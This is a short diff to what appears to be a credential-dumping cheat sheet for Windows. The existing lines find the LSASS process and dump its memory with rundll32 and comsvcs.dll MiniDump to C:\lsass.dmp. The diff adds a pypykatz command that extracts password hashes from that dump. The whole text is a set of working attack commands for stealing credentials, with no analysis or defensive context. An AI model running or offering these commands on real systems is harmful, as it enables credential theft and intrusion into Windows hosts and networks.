@@ -3,3 +3,6 @@ Get-Process lsass | Format-Table Id,ProcessName
 
 Dump:
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 600 C:\lsass.dmp full
+
+extract hashes:
+pypykatz lsa minidump file.dmp
